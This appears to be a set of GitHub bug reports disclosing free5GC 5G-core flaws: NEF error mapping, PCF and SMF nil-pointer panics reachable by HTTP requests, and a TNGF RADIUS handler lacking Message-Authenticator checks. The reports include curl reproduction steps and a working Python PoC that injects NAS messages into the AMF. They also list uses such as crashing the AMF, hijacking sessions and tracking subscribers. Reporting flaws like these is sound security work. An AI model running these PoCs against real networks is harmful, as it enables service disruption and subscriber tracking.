items.title: [Bugs] NEF incorrectly returns 500 for missing PFD data (UDR 404) in Nnef_PfdManagement GET request (JSON parse error: invalid character 'n')
items.body: ## Bug Decription A GET request to the Nnef_PfdManagement API for an individual application PFD returns 500 Internal Server Error when the requested appId does not exist in UDR (UDR returns 404). Instead of mapping the downstream UDR 404 to a proper 4xx client error (e.g., 404 Not Found), NEF attempts to parse the UDR error body as JSON and fails with: invalid character 'n' after top-level value This causes NEF to treat the situation as a system failure and return 500. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Check the IP and Port for NEF component 3. set oauth to false in nrfcfg.yaml for test convenience 4. Run the following command: curl -v "http://127.0.0.5:8000/nnef-pfdmanagement/v1/applications/1?supported-features=1a2b" -H "Accept: application/json" 5. I get this result because i fuzz the http message, so i give all seeds to help you to confirm this issue: [vuln_5xx_20251225_120438.txt](https://github.com/user-attachments/files/24338521/vuln_5xx_20251225_120438.txt) ## Expected Behavior When the requested PFD data does not exist (UDR returns 404), NEF should: Return an appropriate 4xx response (preferably 404 Not Found) instead of 500. Provide a clear, sanitized error message (no internal JSON parsing errors). Properly handle non-JSON downstream error bodies and avoid treating downstream 404 as system failure. ## Screenshots ## Environment free5GC Version: v4.0.1 OS: Ubuntu 20.04 Server Kernel version: 6.8.0-47-generic go version: go1.24.5 linux/amd64 ## Trace Files ### Configuration Files nrfcfg: configuration: MongoDBName: free5gc # database name in MongoDB MongoDBUrl: mongodb://127.0.0.1:27017 # a valid URL of the mongodb sbi: # Service-based interface information scheme: http # the protocol for sbi (http or https) registerIPv4: 127.0.0.10 # IP used to serve NFs or register to another NRF bindingIPv4: 127.0.0.10 # IP used to bind the service port: 8000 # port used to bind the service cert: # the local path of TLS key pem: cert/nrf.pem # NRF TLS Certificate key: cert/nrf.key # NRF TLS Private key rootcert: # the local path of root CA certs pem: cert/root.pem key: cert/root.key oauth: false ### PCAP File [nnef-pfdmanagement.zip](https://github.com/user-attachments/files/24338525/nnef-pfdmanagement.zip) ### Log File Provide the program log file. 2025-12-25T12:18:28.237726708Z [INFO][NEF][PFDF] GetIndividualApplicationPFD - appID[1] 2025-12-25T12:18:28.240781160Z [ERRO][UDR][DataRepo] getApplicationDataIndividualPfdFromDB err: 2025-12-25T12:18:28.240876884Z [INFO][UDR][GIN] | 404 | 127.0.0.1 | GET | /nudr-dr/v2/application-data/pfds/1 | | 2025-12-25T12:18:28.241166611Z [ERRO][NEF][Consumer] APIService error: invalid character 'n' after top-level value 2025-12-25T12:18:28.241390792Z [INFO][NEF][GIN] | 500 | 127.0.0.1 | GET | /nnef-pfdmanagement/v1/applications/1?supported-features=1a2b | |

items.title: [Bugs] PCF app-session delete nil smPolicy panic
items.body:
## Bug Decription
`PCF` `POST /npcf-policyauthorization/v1/app-sessions/{appSessionId}/delete` panics with `runtime error: invalid memory address or nil pointer dereference` inside `HandleDeleteAppSessionContext` whenever the AF/NEF tries to delete an **AppSession that was previously created via the `bdtRefId`-only "BDT policy indication" path**.

The create handler `postAppSessCtxProcedure` has two distinct exit branches:

1. **BDT-only path** (`ascReqData.BdtRefId != ""`, line 168) — stores the AppSession with `appSessId = "BdtRefId-<uuid>"` and returns 201 immediately. The stored `pcf_context.AppSessionData` only fills `AppSessionId` and `AppSessionContext`; `SmPolicyData` is left **nil** (lines 173-178):

   ```go
   data := pcf_context.AppSessionData{
       AppSessionId:      appSessID,
       AppSessionContext: appSessCtx,
       // SmPolicyData NOT set
   }
   pcfSelf.AppSessionPool.Store(appSessID, &data)
   ```

2. **Session-binding path** (line 192 onwards) — runs `pcfSelf.SessionBinding(ascReqData)`, which finds an active SmPolicy for the supplied UE-IP and stores it on `data.SmPolicyData`.

`HandleDeleteAppSessionContext` is shared by both paths but unconditionally dereferences `appSession.SmPolicyData` and several of its sub-fields:

```go
// internal/sbi/processor/policyauthorization.go (deployed v4.2.2 — PCF v1.4.3 line numbers,
//                                                identical at upstream master commit df6c0da)
func (p *Processor) HandleDeleteAppSessionContext(
    c *gin.Context,
    appSessionId string,
    eventsSubscReqData *models.PcfPolicyAuthorizationEventsSubscReqData,
) {
    ...
    appSession := /* loaded from AppSessionPool */
    ...
    smPolicy := appSession.SmPolicyData                                     // line 471 — nil for BDT-only path
    deletedSmPolicyDec := models.SmPolicyDecision{}
    for _, pccRuleID := range appSession.RelatedPccRuleIds {
        if err := smPolicy.RemovePccRule(pccRuleID, &deletedSmPolicyDec); err != nil { ... }  // unreached: range is empty
    }
    delete(smPolicy.AppSessions, appSessionId)                              // <-- 479: nil deref panic
    pcfSelf.AppSessionPool.Delete(appSessionId)
    smPolicy.ArrangeExistEventSubscription()                                // <-- 497: same
    smPolicyID := fmt.Sprintf("%s-%d",
        smPolicy.PcfUe.Supi, smPolicy.PolicyContext.PduSessionId)           // <-- 500: chained derefs (4-level)
    ...
    go p.SendSMPolicyUpdateNotification(
        smPolicy.PolicyContext.NotificationUri, &notification)              // <-- 505: nil deref into goroutine
}
```

The first reachable panic is at line 479 (`smPolicy.AppSessions` field access on a nil receiver). If that line were guarded, lines 497, 500 and 505 would each panic in turn — line 505's panic is **inside a fresh goroutine spawned with `go`**, which has no `defer recover()`, so once line 479 is fixed the same delete request would still tear down the **entire BSF/PCF process** via the unrecovered goroutine panic. Both classes of failure deserve to be fixed together.

This is **distinct from**:
- The `policyauthorization.go:1156` `bdtData := resp.BdtData` panic — that one is on the **create** path with a missing `bdtRefId`, not the delete path.
- The `smpolicy.go:692` `*smPolicy.RemainGbrDL` panic — different SBI, different field.

The same delete handler is **unfixed at the latest upstream master commit `df6c0da`** (no `appSession.SmPolicyData == nil` guard added). Symmetric panic candidates at lines 497, 500, 505 are also unfixed.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment with NRF at `10.100.200.4:8000`, PCF at `10.100.200.3:8000`, UDR reachable, OAuth enabled.

2. Obtain `npcf-bdtpolicycontrol` and `npcf-policyauthorization` access tokens (the lab AMF instance ID works for both):

```bash
BDT_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-bdtpolicycontrol' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

PA_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-policyauthorization' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. Provision a BDT policy so a valid `bdtRefId` exists in UDR (PCF will write it for you):

```bash
BDTREF=$(curl -s -X POST 'http://10.100.200.3:8000/npcf-bdtpolicycontrol/v1/bdtpolicies' \
  -H "Authorization: Bearer $BDT_TOKEN" -H 'Content-Type: application/json' \
  --data '{"aspId":"asp1","desTimeInt":{"startTime":"2026-04-26T00:00:00Z","stopTime":"2026-05-26T00:00:00Z"},"numOfUes":1,"volPerUe":{"totalVolume":1024}}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["bdtPolData"]["bdtRefId"])')
echo "bdtRefId = $BDTREF"
```

4. Create an AppSession via the BDT-only path (no `ueIpv4` / `ueIpv6` / `ueMac`):

```bash
curl -s -i -X POST 'http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions' \
  -H "Authorization: Bearer $PA_TOKEN" -H 'Content-Type: application/json' \
  --data "{\"ascReqData\":{\"notifUri\":\"http://10.0.0.1/notif\",\"suppFeat\":\"0\",\"bdtRefId\":\"$BDTREF\"}}"
# 201 Created. Location: /npcf-policyauthorization/v1/app-sessions/BdtRefId-$BDTREF
```

5. Delete it:

```bash
curl -i -X POST "http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions/BdtRefId-${BDTREF}/delete" \
  -H "Authorization: Bearer $PA_TOKEN" -H 'Content-Type: application/json' \
  --data '{}'
```

6. PCF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery). `docker logs pcf` shows:

```text
[INFO][PCF][PolAuth] Handle Del AppSessions, AppSessionId[BdtRefId-03097607-8db6-4f02-aaba-8aa915128dfc]
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleDeleteAppSessionContext(0xc0002d08e0, 0xc0005fc900, ...)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:479 +0x3d4
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPDeleteAppSession(0xc00040d960, 0xc0005fc900)
        /go/src/free5gc/NFs/pcf/internal/sbi/api_policyauthorization.go:238 +0x54f
[INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-policyauthorization/v1/app-sessions/BdtRefId-...../delete |  |
```

Each subsequent delete reproduces the panic; PCF keeps running because Gin's `defer recover()` catches it, but every request leaves a stack trace and the AppSession is never cleaned up — usable as a per-request DoS / log-volume amplification, **and** a state leak (the AppSession entry remains in `AppSessionPool` after the failed delete because `pcfSelf.AppSessionPool.Delete` at line 495 is unreachable).

If a future fix only adds a nil-guard to line 479, lines 497, 500, 505 still panic. Line 505's panic happens inside a **goroutine spawned without panic recovery** (`go p.SendSMPolicyUpdateNotification(smPolicy.PolicyContext.NotificationUri, ...)`), so a partial fix turns a per-request 500 into a process-fatal crash DoS.

## Expected Behavior
Reject the delete with a controlled `400 / 403` `ProblemDetails` for BDT-only AppSessions, or take the BDT-only branch in the delete handler (no PCC rule cleanup, no SM Policy notification — just `AppSessionPool.Delete(appSessionId)` and `204 No Content`):

```go
smPolicy := appSession.SmPolicyData
if smPolicy == nil {
    // BDT-only AppSession — nothing to undo on the SM side
    pcfSelf.AppSessionPool.Delete(appSessionId)
    c.Status(http.StatusNoContent)
    return
}
// ... existing PCC-rule cleanup path
```

The same nil-guard pattern should also wrap the goroutine at line 505 (`SendSMPolicyUpdateNotification`) — or at minimum, the goroutine should `defer recover()` so a future regression cannot tear down the PCF process.

## Environment
- free5GC Version: `v4.2.2`
- PCF binary: `free5gc/pcf:v4.2.2` (PCF release tag `v1.4.3`). The same `policyauthorization.go:479` (and the further unreachable derefs at 497/500/505) is **unfixed at the latest upstream master commit `df6c0da`** (no `appSession.SmPolicyData == nil` guard added in `HandleDeleteAppSessionContext`).
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/pcf:v4.2.2` Docker image)
- Validation date: `2026-04-27`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. PCF `10.100.200.3`, NRF `10.100.200.4`, UDR `10.100.200.x`.

### Log File
Representative panic trace from the validated reproduction:

```text
2026-04-27T03:31:20.630849612Z [INFO][PCF][PolAuth] Handle Del AppSessions, AppSessionId[BdtRefId-03097607-8db6-4f02-aaba-8aa915128dfc]
2026-04-27T03:31:20.630861464Z [WARN][PCF][PolAuth] Delete AppSessions does not support with Event Subscription
2026-04-27T03:31:20.630936063Z [ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 13010 [running]:
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleDeleteAppSessionContext(0xc0002d08e0, 0xc0005fc900, {0xc00013f83f, 0x2d}, 0xc0002b5400)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:479 +0x3d4
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPDeleteAppSession(0xc00040d960, 0xc0005fc900)
        /go/src/free5gc/NFs/pcf/internal/sbi/api_policyauthorization.go:238 +0x54f
2026-04-27T03:31:20.630944249Z [INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-policyauthorization/v1/app-sessions/BdtRefId-..../delete |  |
```

items.title: [Bugs] SMF charging notification chgInfo nil dereference, causing DoS
items.body:
## Bug Decription
`SMF` `POST /nsmf-callback/notify_<smContextRef>` (the **unauthenticated** Charging Notification callback) panics with `runtime error: invalid memory address or nil pointer dereference` inside `chargingNotificationProcedure` whenever the supplied `smContextRef` resolves to a live SMContext that has at least one PDU session active.

`smContext.UrrTable[upfId]` is populated for **every** URR registered via `RegisterUrr()` — including the **non-charging** Measurement-Before-QoS-Enforcement (MBQE) and Measurement-After-QoS-Enforcement (MAQE) URRs added by `addUrrToPath` → `addUrrToNode` (`internal/context/datapath.go:531-558`) whenever `urrPeriod != 0` or `urrThreshold != 0` (the lab default is `urrPeriod: 10s, urrThreshold: 1000` — these are the values shipped in `config/smfcfg.yaml`).

`smContext.ChargingInfo[urrID]` is **only** populated for charging URRs (in `AddChargingRules` at `datapath.go:1245` and `GetOrCreateUrr` at `datapath.go:1325`). MBQE/MAQE URRs are absent from this map.

The chargingNotificationProcedure iterates **every** URR in `UrrTable` and dereferences `ChargingInfo[urrID]` without nil-checking the result:

```go
// internal/sbi/processor/notifier.go (deployed v4.2.2 — SMF v1.4.3 line numbers,
//                                     identical at upstream master commit 2232d29)
func (p *Processor) chargingNotificationProcedure(
    req models.ChargingNotifyRequest, smContextRef string,
) *models.ProblemDetails {
    if smContext := smf_context.GetSMContextByRef(smContextRef); smContext != nil {
        smContext.SMLock.Lock()
        defer smContext.SMLock.Unlock()
        upfUrrMap := make(map[string][]*smf_context.URR)
        for _, reauthorizeDetail := range req.ReauthorizationDetails {
            rg := reauthorizeDetail.RatingGroup
            ...
            for upfId, entries := range smContext.UrrTable {
                for urrID, entry := range entries {
                    chgInfo := smContext.ChargingInfo[urrID]   // <-- 48: nil for MBQE/MAQE URRs
                    if chgInfo.RatingGroup == rg ||             // <-- 49: nil deref panic
                       chgInfo.ChargingLevel == smf_context.PduSessionCharging {
                        ...
                    }
                }
            }
        }
        ...
    }
}
```

The other `ChargingInfo[urrID]` access sites in the codebase are properly guarded — `getUrrsByRg` (`charging_trigger.go:256`) explicitly nil-checks `smContext.ChargingInfo[urrID] != nil` before the field deref, and `ulcl_procedure.go:169-170` filters via `pccRule.Datapath.GetChargingUrr(smContext)` (`datapath.go:1213-1216`) which only returns URRs already present in `ChargingInfo`. **`notifier.go:48-49` is the lone unsafe site**.

The endpoint is **unauthenticated**: SMF's callback router (`internal/sbi/server.go:74-81`) only invokes the OAuth check when the route's `:smContextRef` parameter is non-empty. The wildcard route `/:notifyUri` registered for `HTTPChargingNotification` (`api_callback.go:30-32`) does **not** carry a `smContextRef` parameter, so the auth middleware short-circuits and any caller on the SBI network can hit the procedure.

This is the **post-#904 follow-on bug**: free5gc/free5gc#904 patched the original `strings.Split(notifyUri, "_")[1]` index-out-of-range panic by adding a `notify_` prefix check at `api_callback.go:73-78`. Once that fix landed, the chargingNotificationProcedure became reliably reachable for valid `notify_<smContextRef>` requests and exposed the separate `ChargingInfo[urrID]` nil deref.

This is **distinct from**:
- free5gc/free5gc#904 — the now-fixed `Split[1]` panic on short/malformed `notifyUri`. My finding fires **after** that path has been patched.
- free5gc/free5gc#905 / #906 — UPI handler panics on invalid topology / overlapping pools. Different SBI surface.
- free5gc/free5gc#907 / #966 / #991 — different sinks in the create / SM-policy / TI flows.

The same `notifier.go:48-49` lines are **unfixed at the latest upstream master commit `2232d29`**.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment with the default `config/smfcfg.yaml` (`urrPeriod: 10`, `urrThreshold: 1000`) so MBQE/MAQE measurement URRs are added to every PDU session.

2. Provision the test subscriber so PDU session establishment can complete. The default lab UE registers with `S-NSSAI sst=1, sd=112233`; mongo must contain a matching `sessionManagementSubscriptionData` entry:

```bash
docker exec <mongo-container> mongo --quiet free5gc --eval '
db["subscriptionData.provisionedData.smData"].insertOne({
  "ueId": "imsi-208930000000001",
  "servingPlmnId": "20893",
  "singleNssai": {"sst": 1, "sd": "112233"},
  "dnnConfigurations": {
    "internet": {
      "pduSessionTypes": {"defaultSessionType": "IPV4", "allowedSessionTypes": ["IPV4"]},
      "sscModes": {"defaultSscMode": "SSC_MODE_1", "allowedSscModes": ["SSC_MODE_2","SSC_MODE_3"]},
      "5gQosProfile": {"5qi": 9, "arp": {"priorityLevel": 8, "preemptCap": "", "preemptVuln": ""}, "priorityLevel": 8},
      "sessionAmbr": {"uplink": "200 Mbps", "downlink": "100 Mbps"}
    }
  }
});'
```

3. Bring the registered UE through PDU session establishment via UERANSIM (or any RAN simulator). On success, SMF logs:

```text
[INFO][SMF][CTX] Allocated UE IP address: 10.61.0.1
[INFO][SMF][PduSess] Sending PFCP Session Establishment Request
[INFO][SMF][PduSess] Received PFCP Session Establishment Accepted Response
[INFO][SMF][PduSess] Received PFCP Session Modification Accepted Response from AN UPF
```

At this point `smContext.UrrTable` contains MBQE and MAQE URRs but `smContext.ChargingInfo` does not (no charging URRs were created in this minimal flow).

4. Read the active `smContextRef` from SMF logs:

```bash
SMCTX=$(docker logs --tail 100 smf 2>&1 | grep -oE "urn:uuid:[a-f0-9-]+" | tail -1)
echo "Active smContextRef: $SMCTX"
```

5. Send the unauthenticated charging notification — **no `Authorization` header required**:

```bash
curl -i -X POST "http://10.100.200.13:8000/nsmf-callback/notify_${SMCTX}" \
  -H 'Content-Type: application/json' \
  --data '{"reauthorizationDetails":[{"ratingGroup":1}]}'
```

6. SMF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery converts the panic). `docker logs smf` shows:

```text
[INFO][SMF][Charging] Handle Charging Notification
[INFO][SMF][Charging] Force update charging information for rating group 1
[ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 519 [running]:
panic({0xeb2da0?, 0x1986d10?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/smf/internal/sbi/processor.(*Processor).chargingNotificationProcedure(0xc000494760, ..., {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:49 +0x5a4
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandleChargingNotification(0xc000494760, 0xc00065c300, ...)
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:25 +0xd5
github.com/free5gc/smf/internal/sbi.(*Server).HTTPChargingNotification(0xc000496aa0, 0xc00065c300)
        /go/src/free5gc/NFs/smf/internal/sbi/api_callback.go:82 +0x373
```

Each subsequent identical request reproduces the panic deterministically — the SMF process keeps running because Gin's `defer recover()` catches it, but every notification fails with a stack trace and the legitimate charging-reauthorization is dropped on the floor. **No authentication is required**, so the panic is reachable by any host on the SBI network (the same trust boundary as #860 / #904 / #905 / #906 documented for SMF's callback and UPI surfaces).

## Expected Behavior
`chargingNotificationProcedure` should nil-guard the `ChargingInfo[urrID]` lookup before dereferencing the value, mirroring the precedent already set by `getUrrsByRg` at `charging_trigger.go:255-261`:

```go
for upfId, entries := range smContext.UrrTable {
    for urrID, entry := range entries {
        chgInfo := smContext.ChargingInfo[urrID]
        if chgInfo == nil {
            continue   // non-charging URR (e.g. MBQE/MAQE measurement URR)
        }
        if chgInfo.RatingGroup == rg ||
           chgInfo.ChargingLevel == smf_context.PduSessionCharging {
            ...
        }
    }
}
```

A malformed or attacker-supplied callback should result in either the existing 404 (when the SMContext doesn't exist) or a 204 No Content with the request silently ignored for non-charging URRs — never a `runtime error: invalid memory address or nil pointer dereference` / 500.

## Environment
- free5GC Version: `v4.2.2`
- SMF binary: `free5gc/smf:v4.2.2` (commit hash `2232d299`, build time `2026-04-21T03:13:45Z`). The same `notifier.go:48-49` lines are **unfixed at the latest upstream master commit `2232d29`** (no nil guard added).
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/smf:v4.2.2` Docker image)
- Validation date: `2026-04-27`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. SMF `10.100.200.13`, UPF `10.100.200.14`, NRF `10.100.200.4`, AMF `10.100.200.16`, MongoDB container `081af9111608_mongodb`. The registered UE is `imsi-208930000000001` with `S-NSSAI sst=1, sd=112233, dnn=internet` (UERANSIM-driven).

### Log File
Representative panic trace from the validated reproduction:

```text
2026-04-27T05:43:33.426209203Z [INFO][SMF][Charging] Handle Charging Notification
2026-04-27T05:43:33.426224010Z [INFO][SMF][Charging] Force update charging information for rating group 1
2026-04-27T05:43:33.426316713Z [ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 519 [running]:
github.com/free5gc/smf/internal/sbi/processor.(*Processor).chargingNotificationProcedure(0xc000494760, {{0x0, 0x0}, {0xc0009a2b10, 0x1, 0x1}}, {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:49 +0x5a4
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandleChargingNotification(0xc000494760, 0xc00065c300, {{0x0, 0x0}, {0xc0009a2b10, 0x1, 0x1}}, {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:25 +0xd5
github.com/free5gc/smf/internal/sbi.(*Server).HTTPChargingNotification(0xc000496aa0, 0xc00065c300)
        /go/src/free5gc/NFs/smf/internal/sbi/api_callback.go:82 +0x373
```

### Notes on exploitability
The panic is reachable **without any authentication** because SMF's callback group only OAuth-checks routes whose path parameter is named `smContextRef`; the `:notifyUri` wildcard route used by `HTTPChargingNotification` doesn't have that parameter, so the auth check is skipped. Any host on the SBI network — or any compromised NF — can drive this 500 storm with one HTTP POST per active SMContext.

Reachability requires only that:
- the SMContext is in the SMF's pool (PDU session has been established),
- `urrPeriod` or `urrThreshold` is non-zero (default `smfcfg.yaml` ships with both non-zero),
- and the attacker knows / can guess / can read from logs the `urn:uuid:<smContextRef>` value.

The first two are baseline operating conditions for any production deployment. The third is trivially leaked by SMF's own structured logs and by AMF's `Location` header on the original `POST /nsmf-pdusession/v1/sm-contexts` create that returns a `/sm-contexts/<smContextRef>` URI.

items.title: [Bugs] TNGF RADIUS handler does not enforce Message-Authenticator attribute, allowing unauthenticated NAS PDU injection into 5G core without RADIUS shared secret
items.body:
## Bug Description

The TNGF RADIUS handler processes `Access-Request` packets containing `EAP-Message` attributes without requiring or enforcing the `Message-Authenticator` attribute (Type 80). Per RFC 3579 Section 3.1, when an `Access-Request` includes an `EAP-Message` attribute, it **MUST** also include a `Message-Authenticator` attribute. The `Message-Authenticator` is an HMAC-MD5 computed with the RADIUS shared secret, and its absence means the packet's integrity and origin are completely unverified.

Because TNGF does not enforce this requirement, **any attacker who can send UDP packets to port 1812 can inject arbitrary RADIUS Access-Requests without knowing the RADIUS shared secret**. The attacker can progress through the full EAP-5G state machine and ultimately **inject arbitrary NAS PDUs into the AMF** via TNGF's NGAP interface.

**Vulnerable code** — `NFs/tngf/pkg/radius/handler/handler.go` lines 67-79:
```go
// Message-Authenticator is ONLY validated IF the attribute is present
case radius_message.TypeMessageAuthenticator:
    requestMessageAuthenticator = radiusPayload.Val
    // ... validate HMAC ...
    if !bytes.Equal(requestMessageAuthenticator, exRequestMessageAuthenticator) {
        radiusLog.Errorln("Request Message Authenticator error")
        return
    }
```

After the attribute parsing loop (line 80+), there is **no check** that `requestMessageAuthenticator != nil`. The handler proceeds directly to session lookup and EAP-5G processing:

```go
// Line 80-85: No enforcement that Message-Authenticator was present
var session *context.RadiusSession
session, ok := tngfSelf.RadiusSessionPoolLoad(callingStationId)
if !ok {
    session = tngfSelf.NewRadiusSession(callingStationId)
}

switch session.State {
case EAP5GStart:
    // Process Identity → send 5G-Start (no auth required)
case EAP5GNAS:
    // Process EAP-5G NAS → forward NAS PDU to AMF (no auth required)
```

**Complete attack chain** (verified on live Docker):

```
Step 1: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"
    EAP-Message = EAP-Response/Identity("anonymous")
    [NO Message-Authenticator]

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-Start       ← Session created, state → EAP5GNAS

Step 2: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"       ← same session
    EAP-Message = EAP-Response/5G-NAS:
      AN-Parameters: GUAMI + PLMN + EstablishmentCause
      NAS-PDU: Registration Request with SUCI
    [NO Message-Authenticator]

  TNGF internally:
    [INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
    [INFO][TNGF][Radius] Selected AMF Name: AMF
    [INFO][TNGF][NGAP] [TNGF] Send Initial UE Message   ← NAS injected into AMF!

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-NAS(AuthenticationRequest)  ← AMF responded with auth vector
```

The attacker has successfully injected a NAS Registration Request into the AMF without possessing the RADIUS shared secret.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF and AMF deployed in Docker.

1. PoC script — complete 2-step attack:

```python
#!/usr/bin/env python3
"""PoC: Inject NAS PDU into 5G core via TNGF RADIUS without shared secret"""
import socket, struct, os, time

TARGET = ('10.100.200.1', 1812)

def send_radius(sock, pkt_id, attrs):
    authenticator = os.urandom(16)
    length = 20 + len(attrs)
    pkt = struct.pack('!BBH', 1, pkt_id, length) + authenticator + attrs
    sock.sendto(pkt, TARGET)
    resp, _ = sock.recvfrom(4096)
    return resp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5)

# --- Step 1: EAP-Response/Identity (no Message-Authenticator) ---
calling = bytes([31, 19]) + b'AA-BB-CC-DD-EE-FF'
called = bytes([30, 27]) + b'11-22-33-44-55-66:TestSSID'
eap_id = struct.pack('!BBH', 2, 0, 14) + bytes([1]) + b'anonymous'
eap_attr = bytes([79, 2 + len(eap_id)]) + eap_id

resp = send_radius(sock, 0x01, calling + called + eap_attr)
eap_resp_id = resp[20 + 2 + 1]  # extract EAP identifier from response
print(f"[+] Step 1: Got Access-Challenge (Code={resp[0]}), EAP ID={eap_resp_id}")

# --- Step 2: EAP-5G NAS with Registration Request ---
guami = bytes([1,6, 0x02,0xf8,0x39, 0x40,0x01,0x00])
plmn = bytes([2,3, 0x02,0xf8,0x39])
est = bytes([4,1, 0x03])
an_params = guami + plmn + est
nas_pdu = bytes([0x7E,0x00,0x41,0x01,0x00,0x07,0x00,
                 0x02,0xf8,0x39,0x00,0x00,0x00,0x00,0x00,0x00,0x01])

vendor_data = bytes([2,0]) + struct.pack('!H', len(an_params)) + an_params + \
              struct.pack('!H', len(nas_pdu)) + nas_pdu
eap_exp = bytes([254, 0x00,0x28,0xAF]) + struct.pack('!I', 3) + vendor_data
eap_5g = struct.pack('!BBH', 2, eap_resp_id, 4+len(eap_exp)) + eap_exp
eap_attr2 = bytes([79, 2+len(eap_5g)]) + eap_5g

resp2 = send_radius(sock, 0x02, calling + called + eap_attr2)
print(f"[+] Step 2: Got response (Code={resp2[0]}), {len(resp2)} bytes")
print(f"[!] NAS PDU injected into AMF — check: docker logs tngf | grep 'Initial UE Message'")
sock.close()
```

2. Run:

```bash
docker restart tngf && sleep 10
python3 poc_radius_inject.py
docker logs tngf 2>&1 | tail -10
```

3. TNGF logs confirm NAS forwarded to AMF:

```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message        ← NAS injected into AMF
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport   ← AMF processed it
```

## Security Impact

1. **NAS PDU Injection**: Attacker can inject arbitrary NAS messages into the AMF, including Registration Requests with crafted SUCI/GUTI/NSSAI. This reaches the same code paths as the NAS TOCTOU crashes (CVE bugs V-01 through V-05), but now triggerable from the **RADIUS network** without any Wi-Fi association or EAP authentication.

2. **AMF Crash via RADIUS**: Combined with the NAS MobileIdentity OOB panics (bug-reports 1-5), an attacker can crash the AMF by injecting a 7-byte NAS Registration Request (`7E 00 41 01 00 01 01`) through TNGF's unauthenticated RADIUS path.

3. **Fake UE Registration**: Attacker can initiate registration procedures for arbitrary SUCIs, causing the AMF to query AUSF/UDM, consuming backend resources.

4. **Session Hijacking**: By using a known UE's `Calling-Station-Id` (MAC address), an attacker can inject messages into an existing UE's RADIUS session.

5. **Amplification**: A single unauthenticated RADIUS packet (83 bytes) causes TNGF to perform NGAP signaling to AMF, which triggers SBI calls to AUSF/UDM — significant amplification from UDP to TCP/HTTP.

6. **Location Tracking**: By probing multiple TNGFs' RADIUS ports with a target UE's MAC address as `Calling-Station-Id`, an attacker can determine which TNGF currently holds a session for that UE. Periodic probing across geographically distributed TNGFs reveals the target's physical movement trajectory — remotely, without physical proximity, and unaffected by MAC randomization (since `Calling-Station-Id` uses the post-association real MAC).

7. **Targeted UE Denial-of-Service**: By hijacking a specific UE's RADIUS session (using its known MAC address), an attacker can corrupt the session state or inject NAS Deregistration Requests through the victim's NGAP context, forcing the target UE off the 5G network.

8. **Core Network State Oracle**: An attacker can inject various NAS message types (Registration Request with 5G-GUTI, Service Request, Deregistration) through a hijacked session and observe AMF's responses via RADIUS. The response differences reveal whether the target UE is registered, has an active PDU session, or holds a valid security context — leaking per-UE core network state to an unauthenticated attacker.

## Expected Behavior

